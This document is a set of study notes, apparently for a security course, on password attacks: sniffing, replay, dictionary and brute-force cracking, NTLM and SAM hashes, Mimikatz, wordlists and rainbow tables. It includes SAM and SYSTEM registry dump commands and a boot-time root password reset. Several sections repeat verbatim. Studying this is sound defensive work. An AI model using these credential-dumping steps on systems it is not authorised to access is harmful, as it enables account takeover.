- Wire Sniffing

- • Attackers run packet sniffer tools on LAN network to access and record the raw network traffic.

- • Captured data may include sensitive information such as passwords and emails.

- • Sniffed credentials are used to gain unauthorized access to the target system.

<!-- -->

- **Man-in-the-Middle**

<!-- -->

- **Gain access to the communication channels**: In a MITM attack, the attacker acquires access to the communication channels between victim and server to extract the information.

- **Use sniffer**: In a replay attack, packets and authentication tokens are captured using a sniffer. After the relevant info is extracted, the tokens are placed back on the network to gain access.

- **Considerations**:

  - Relatively hard to perpetrate

  - Must be trusted by one or both sides

  - Can sometimes be broken by invalidating traffic

**Replay Attack**

Dictionary attack

A dictionary of common passwords is used to gain access to the computer and network of the victim. One method is to copy an encrypted that has the passwords, apply the same encryption to a dictionary of regularly used passwords, and contrast the findings.

**Password and Key Cracking**

- Launching Dynamic attack points

- Hosting malicious Data

- Botnet command and control

- Building rainbow tables

- CAPTCHA Solving

- Exploits exists already

Dictionary attacks and tools are used

Hydra: Hydra is a parallelized network login cracker built in various operating systems like Kali Linux. For more information refer: - <https://en.wikipedia.org/wiki/Hydra_(software)>, - www.thc.org/thc-hydra/

- Crunch - In-built password attack tool in Kali Linux

- CeWL - In-built password attack tool in Kali Linux

- Cupp

- Medusa

- Online Attacks

Dictionary & Passwords Attacks

- Hydra: Hydra is a parallelized network login cracker built in various operating systems like Kali Linux. For more information refer: - <https://en.wikipedia.org/wiki/Hydra_(software)>, - www.thc.org/thc-hydra/

- Crunch - In-built password attack tool in Kali Linux

- CeWL - In-built password attack tool in Kali Linux

- Cupp

<!-- -->

- Medusa

- Online Attacks

# Distributed Network Attack

- A Distributed Network Attack (DNA) technique is used for recovering passwords from hashes or password protected files using the unused processing power of machines across the network to decrypt passwords.

- The DNA Manager is installed in a central location where machines running on DNA Client can access it over the network.

- DNA Manager coordinates the attack and allocates small portions of the key search to machines that are distributed over the network.

- DNA Client runs in the background, consuming only unused processor time.

- The program combines the processing capabilities of all the clients connected to the network and uses it to crack the password.

- **Elcomsoft Distributed Password Recovery**: Elcomsoft Distributed Password Recovery breaks complex passwords, recovers strong encryption keys, and unlocks documents in a production environment.

- Microsoft Authentication

- **Security Accounts Manager (SAM) Database**: Windows stores user passwords in SAM, or in the Active Directory database in domain. Passwords are never stored in clear text; passwords are hashed and the results are stored in the SAM.

- **NTLM Authentication**: The NTLM authentication protocol types:

  - NTLM authentication protocol

  - LM authentication protocol

- These protocols store the user's password in the SAM database using different hashing methods.

- **Kerberos Authentication**: Microsoft has upgraded its default authentication protocol to Kerberos which provides a stronger authentication for client/server applications than NTLM.

Distributed Network Attack

- A Distributed Network Attack (DNA) technique is used for recovering passwords from hashes or password protected files using the unused processing power of machines across the network to decrypt passwords.

- The DNA Manager is installed in a central location where machines running on DNA Client can access it over the network.

- DNA Manager coordinates the attack and allocates small portions of the key search to machines that are distributed over the network.

- DNA Client runs in the background, consuming only unused processor time.

- The program combines the processing capabilities of all the clients connected to the network and uses it to crack the password.

- **Elcomsoft Distributed Password Recovery**: Elcomsoft Distributed Password Recovery breaks complex passwords, recovers strong encryption keys, and unlocks documents in a production environment.

- Microsoft Authentication

- **Security Accounts Manager (SAM) Database**: Windows stores user passwords in SAM, or in the Active Directory database in domain. Passwords are never stored in clear text; passwords are hashed and the results are stored in the SAM.

- **NTLM Authentication**: The NTLM authentication protocol types:

  - NTLM authentication protocol

  - LM authentication protocol

- These protocols store the user's password in the SAM database using different hashing methods.

- **Kerberos Authentication**: Microsoft has upgraded its default authentication protocol to Kerberos which provides a stronger authentication for client/server applications than NTLM.

**Password Salting**

- Password salting is a technique where random strings of character are added to the password to the password before calculating their hashes.

- Advantage: Salting makes it more difficult to reverse the hashes and defeats precomputed hash attacks.

- Note: Windows password hashes are not salted pwdump7 and fgdump

- PWDUMP extracts LM and NTLM password hashes of local user accounts from the Security Account Manager (SAM) database.

- fgdump works like pwdump but also extracts cached credentials and allows remote network execution.

- These tools must be run with administrator privileges.

**Password Cracking Tool for Mobile: FlexiSPY Password Grabber**

- It captures the security pattern used to access the phone itself and crack the passcode used to unlock the iPhone, plus the actual passwords they use for social messaging.

- It allows you to login to their Facebook, Skype, Twitter, Pinterest, LinkedIn, Gmail and other Email accounts directly from your own computer.

**How to Defend against Password Cracking?**

- Enable information security audit to monitor and track password attacks.

- Do not use the same password during password change.

- Do not share passwords.

- Do not use passwords that can be found in a dictionary.

- Do not use cleartext protocols and protocols with weak encryption.

- Set the password change policy to 30 days.

- Avoid storing passwords in an unsecured location.

- Do not use any system's default passwords.

- Make passwords hard to guess by using 8-12 alphanumeric characters in combination of uppercase and lowercase letters, numbers, and symbols.

- Ensure that applications neither store passwords to memory nor write them to disk in clear text.

- Use a random string (salt) as prefix or suffix with the password before encrypting.

- Enable SYSKEY with a strong password to encrypt and protect the SAM database.

- Never use passwords such as date of birth, spouse, or child's or pet's name.

- Monitor the server's logs for brute force attacks on the users accounts.

- Lock out an account subjected to too many incorrect password guesses.

<!-- -->

- Credential dumping refers to the act of obtaining user credentials (username and password) from an operating system or a software. These are normally obtained in the form of a hash or a clear text, which is then used to perform lateral movement, access restricted information, or to install malware. Once this is done, the attacker can login to the system at will and access the information available in it.

-  

- **Credentials from Password Stores (Digital Vaults)**

- **Forced Authentication**

- **Network Sniffing**

- ** **

- **Windows Autologin Password command line application**

- Windows Autologin Password is a useful command-line application that enables you to manage your computer's automatic logon feature. Using a simple command in the terminal, you can quickly dump the current password and disable the automatic login by requesting user credentials before jumping into the desktop screen.

-  

- <https://docs.microsoft.com/en-us/sysinternals/downloads/autologon>

<!-- -->

- **OS Credential Dumping**

- Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.

# Linux

- **Crack Linux machine root password**: During boot, press "e", where there is linux line edit it and on it replace ro with rw and remove splash and enter "init=/bin/bash" press "CTRL+X" and change password using "passwd" then "reboot -f"

# Windows IAM

- **Crack Windows machine password: Use HirenbootCD.**

**How Hash Passwords Are Stored in Windows SAM?**

**Note**: LM hashes were disabled in Windows Vista and later Windows OS, LM will be blank in those systems.

- reg save hklm\sam c:\temp\sam.save

- reg save hklm\system c:\temp\system.save

- pwdump, SMBPasswd

**Kerberos Authentication**

**NTLM Authentication**

Note: Microsoft has upgraded its default authentication protocol to Kerberos, which provides stronger authentication for client/server applications than NTLM.

**NTLM authentication step-by-step process:**

1.  The user shares their username, password, and domain name with the client.

2.  The client **develops a scrambled** version of the password, known as a **hash**, and **deletes the full password.**

3.  The **client passes a plain text** version of the **username to the relevant server**.

4.  The server replies to the client with a **challenge or nonce**, which is a **16-byte random number.**

5.  **Client encrypts** this **challenge** with the **hash of the user's password** and **returns the result to the server** called <span class="mark">response</span>.

6.  **Server** sends the **username, challenge** sent to the client, and **response** received from the client to the <span class="mark">domain controller</span>.

7.  **Domain controller** uses the **username** to **retrieve the hash of the user's password** from the <span class="mark">Security Account Manager DB</span>.

8.  It uses this password hash to encrypt the challenge.

9.  **Domain controller** compares the **encrypted challenge** with the **response** computed by the **client**. <span class="mark">If they are identical, authentication is successful.</span>

Please note that encryption methods can vary between versions of NTLM and different server settings.

**Password Salting**

- Password salting is a technique where random strings of character are added to the password to the password before calculating their hashes.

- Advantage: Salting makes it more difficult to reverse the hashes and defeats precomputed hash attacks.

- Note: Windows password hashes are not salted pwdump7 and fgdump

- PWDUMP extracts LM and NTLM password hashes of local user accounts from the Security Account Manager (SAM) database.

- fgdump works like pwdump but also extracts cached credentials and allows remote network execution.

- These tools must be run with administrator privileges.

**Password Cracking Tool for Mobile: FlexiSPY Password Grabber**

- It captures the security pattern used to access the phone itself and crack the passcode used to unlock the iPhone, plus the actual passwords they use for social messaging.

- It allows you to login to their Facebook, Skype, Twitter, Pinterest, LinkedIn, Gmail and other Email accounts directly from your own computer.

**How to Defend against Password Cracking?**

- Enable information security audit to monitor and track password attacks.

- Do not use the same password during password change.

- Do not share passwords.

- Do not use passwords that can be found in a dictionary.

- Do not use cleartext protocols and protocols with weak encryption.

- Set the password change policy to 30 days.

- Avoid storing passwords in an unsecured location.

- Do not use any system's default passwords.

- Make passwords hard to guess by using 8-12 alphanumeric characters in combination of uppercase and lowercase letters, numbers, and symbols.

- Ensure that applications neither store passwords to memory nor write them to disk in clear text.

- Use a random string (salt) as prefix or suffix with the password before encrypting.

- Enable SYSKEY with a strong password to encrypt and protect the SAM database.

- Never use passwords such as date of birth, spouse, or child's or pet's name.

- Monitor the server's logs for brute force attacks on the users accounts.

- Lock out an account subjected to too many incorrect password guesses.

<!-- -->

- Credential dumping refers to the act of obtaining user credentials (username and password) from an operating system or a software. These are normally obtained in the form of a hash or a clear text, which is then used to perform lateral movement, access restricted information, or to install malware. Once this is done, the attacker can login to the system at will and access the information available in it.

-  

- **Credentials from Password Stores (Digital Vaults)**

- **Forced Authentication**

- **Network Sniffing**

- ** **

- **Windows Autologin Password command line application**

- Windows Autologin Password is a useful command-line application that enables you to manage your computer's automatic logon feature. Using a simple command in the terminal, you can quickly dump the current password and disable the automatic login by requesting user credentials before jumping into the desktop screen.

-  

- <https://docs.microsoft.com/en-us/sysinternals/downloads/autologon>

<!-- -->

- **OS Credential Dumping**

- Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.

# Mimikatz

Mimikatz is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks.

- GetPassword_x64

- Carbanak

- Axiom

- Homefry

- Onionduke

- Empire

# Lateral Movement

- Lateral Movement & its methodologies

- Remote Service

- Exploitation of Remote Services

- Remote Service Session Hijacking

- Lateral Tool Transfers

- Use Alternate Authentication Materia

# Wordlists

Wordlist Scanning

Wordlists is used for password cracking, stressing authentication panels, directory brute force. Wordlists in Kali Linux are dirb, Rockyou, Wfuzz wordlists.

- Online wordlists are Github, Seclists, Assetnode, Packetstorm wordlists

- Cleaning wordlists

- Crafting wordlists are CEWL, Crunch, Cupp

- A wordlist is a file (a text file in most cases) that contains a set of values that the attacker requires to provide to test a mechanism.

- Whenever an attacker is faced with an Authentication Mechanism, they can try to work around it but if that is not possible then the attacker has to try some well-known credentials into the Authentication Mechanism to try and guess. This list of well know credentials is a wordlist.

- And instead of manually entering the values one by one, the attacker uses a tool or script to automate this process.

- Similarly, in the case of cracking hash values, the tool uses the wordlists and encodes the entries of wordlists into the same hash and then uses a string compare function to match the hashes.

- If a match is found then hash is deemed as cracked. It can be observed that the importance of wordlist is paramount in the Cyber Security World.

- In Kali Linux, wordlists are located inside the /usr/share directory.

- Here, we have the dirb directory for the wordlists to be used while using the dirb tool to perform Directory Brute force.

Content

- Introduction

- Wordlists in Kali Linux

  - Dirb wordlists

  - Rockyou wordlists

  - Wfuzz wordlists

- Online wordlists

  - Github wordlists

  - Seclists

  - Assetnode wordlists

  - Packetstorm wordlists

- Cleaning wordlists

- Crafting wordlists

  - CEWL

  - Crunch

  - Cupp

  - Pydictor

  - Bopscrk

  - Bewgor

  - Dymerge

  - Mentalist

  - Hashcat/John rules

- Conclusion

- Reference

Introduction

- Wordlists is used for:

  - Password cracking

  - Stressing authentication panels

  - Directory Brute force

- A wordlist is a file (a text file in most cases but not limited to it) that contains a set of values that the attacker requires to provide to test a mechanism.

- Whenever an attacker is faced with an Authentication Mechanism, they can try to work around it but if that is not possible then the attacker has to try some well known credentials into the Authentication Mechanism to try and guess. This list of well know credentials is a wordlist.

- And instead of manually entering the values one by one, the attacker uses a tool or script to automate this process.

- Similarly, in the case of cracking hash values, the tool uses the wordlists and encodes the entries of wordlists into the same hash and then uses a string compare function to match the hashes.

- If a match is found then the hash is deemed as cracked. It can be observed that the importance of wordlist is paramount in the Cyber Security World.

- In Kali Linux, wordlists are located inside the */usr/share* directory.

- Here, we have the dirb directory for the wordlists to be used while using the dirb tool to perform Directory Brute force.

Dirb wordlists

# Rainbow Tables

- *"A rainbow table is a precomputed table for caching the output of cryptographic hash functions, usually for cracking password hashes"*

- Tables are usually used in recovering a key derivation function (or credit card numbers, etc.) up to a certain length consisting of a limited set of characters.

- It is a practical example of a space–time tradeoff, using less computer processing time and more storage than a brute-force attack which calculates a hash on every attempt, but more processing time and less storage than a simple key derivation function with one entry per hash.

- Use of a key derivation that employs a salt makes this attack infeasible.

- Reference: <https://en.wikipedia.org/wiki/Rainbow_table>

## Password Cracking

- Password cracking techniques are used to recover passwords from computer systems

- Attackers use password cracking techniques to gain unauthorized access to vulnerable systems

- Most of the password cracking techniques are successful because of weak or easily guessable passwords

<!-- -->

- Password cracking techniques are used to recover passwords from computer systems.

- Attackers use password cracking techniques to gain unauthorized access to the vulnerable system.

- Most of the password cracking techniques are successful due to weak or easily guessable passwords.

- In this scenario, an attacker has acquired access to a service interface, or to a data store that allows them to try many different password combinations for an account.

- Using specialized software and high-capacity computing, attackers can complete many thousands of combinations in a very short amount of time.

- If the password is very short, very weak, very common, or the same as another account password owned by the user, the chances are very good that an attacker can guess the password and compromise the account.

**Hacker can gain access to the password information of an individual by:**

- By sniffing the connection to the network

- Using social engineering or guessing, an attacker can ‘guess’ a password in a random or systematic way.

- By gaining access to a password database.

<!-- -->

- **Crack Linux machine root password**: During boot, press "e", where there is linux line edit it and on it replace ro with rw and remove splash and enter "init=/bin/bash" press "CTRL+X" and change password using "passwd" then "reboot -f"

- **Crack Windows machine password: Use HirenbootCD.**

# Types of Cyber Attacks on IAM

- Password based attacks

  - Brute Force Attack - Try many passwords against one or more accounts, sometimes using dictionaries of commonly used passwords.

  - Password Spray Attack - Attempts to match username against list of weak passwords.

## Identity Theft Types

- Credit Card Fraud

- Loan or Lease Fraud

- Phone or Utilities Fraud

- Bank Fraud

- Employment or Tax related Fraud

- Government documents or benefits fraud

<!-- -->

- How can identity theft be prevented? Here is what you can do to prevent identity theft: Ensure strong and unique password, avoid sharing confidential information online, especially on social media, Shop from known and trusted websites, Use the latest version of the browsers, install advanced malware and spyware tools, Use specialized security solutions against financial data, Always update your system and the software, Protect your SSN (Social Security Number).

## Dictionary attacks and tools are used

Hydra: Hydra is a parallelized network login cracker built in various operating systems like Kali Linux. For more information refer: - <https://en.wikipedia.org/wiki/Hydra_(software)>, - www.thc.org/thc-hydra/

- Crunch - In-built password attack tool in Kali Linux

- CeWL - In-built password attack tool in Kali Linux

- Cupp

- Medusa

- Online Attacks

## Password attacks

A hacker can gain access to the password information of an individual by ‘sniffing’ the connection to the network, using social engineering, guessing, or gaining access to a password database. An attacker can ‘guess’ a password in a random or systematic way.

## Brute-force password guessing: 

- An attacker uses software to try many different passwords, in the hope of guessing the correct one. The software can use some logic to trying passwords related to the name of the individual, their job, their family, etc. Brute Force Attack is a trial-and-error method that is employed for application programs to decode encrypted data such as data encryption keys or password using brute force rather than using intellectual strategies. It’s a way to identify the right credentials by repetitively attempting all the possible methods.

-  

### Brute Force attack Countermeasures

Adding password complexity: Include different formats of characters to make passwords stronger. Limit login attempts: set a limit on login failures. Two-factor authentication: Add this layer of security to avoid brute force attacks.

## Dictionary attack

A dictionary of common passwords is used to gain access to the computer and network of the victim. One method is to copy an encrypted that has the passwords, apply the same encryption to a dictionary of regularly used passwords, and contrast the findings.

**Password and Key Cracking**

- Launching Dynamic attack points

- Hosting malicious Data

- Botnet command and control

- Building rainbow tables

- CAPTCHA Solving

- Exploits exists already
